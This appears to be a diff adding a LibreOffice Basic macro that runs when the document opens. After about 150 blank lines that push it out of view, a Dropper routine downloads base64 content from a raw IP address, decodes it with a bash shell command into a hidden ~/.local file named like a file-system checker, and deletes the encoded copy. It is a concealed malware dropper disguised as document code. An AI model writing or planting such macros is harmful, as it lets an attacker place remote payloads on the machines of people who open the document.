@@ -1,0 +1,220 @@
+REM  *****  BASIC  *****
+
+Sub Main
+	OpenDoc
+End Sub
+
+Sub OpenDoc
+        REM Print "Document Opened 1"
+        CreateTextFile
+        Dropper
+End Sub
+
+Function GetWebContent(url As string) As String
+    On Eror GoTo ErrorHandler
+
+    Dim funtionAccess As Object
+    functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
+
+    GetWebContent = functionAccess.callFunction("WEBSERVICE",Array(url))
+
+        Exit Function
+ErrorHandler:
+	GetWebContent = "Error " & Err
+End Function
+
+Function Test
+    Dim url As String
+    url = "http://www.google.com"
+    Dim response As String
+    response = GetWebContent(url)
+    MsgBox(response)
+End Function
+
+Sub CreateTextFile
+    fileName = "/home/user/.local/testit.txt"
+    oSFA = CreateUnoService("com.sun.star.ucb.SimpleFileAccess")
+    If oSFA.exists(fileName) Then oSFA.kill(fileName)
+    oTextoutputStream = CreateUnoService("com.sun.star.io.TextOutputStream")
+    outputStream = oSFA.openFileWrite(fileName)
+    oTextoutputStream.setOutputStream(outputStream)
+    oTextoutputStream.writeString("hello world!")   
+    oTextoutputStream.closeOutput()
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Sub Dropper
+	Dim url As String
+	url = "http://123.45.67.201/g48fschck00/fschecker.txt"
+	Dim response As String
+	response = GetWebContent(url)
+	fileName = "/home/user/Documents/fscheckerenc"
+	oSFA = CreateUnoService("com.sun.star.ucb.SimpleFileAccess")
+	If oSFA.exists(fileName) Then oSFA.kill(fileName)
+	oTextoutputStream = CreateUnoService("com.sun.star.io.TextOutputStream")
+	outputStream = oSFA.openFileWrite(fileName)
+	oTextoutputStream.setOutputStream(outputStream)
+	oTextoutputStream.writeString(response)         
+	oTextoutputStream.closeOutput()
+	Shell "bash -c 'base64 -d /home/user/Documents/fscheckerenc > /home/user/.local/fschecker'"
+	Shell "bash -c 'rm /home/user/Documents/fscheckerenc'"
+End Sub
+                               
+                               
+
+
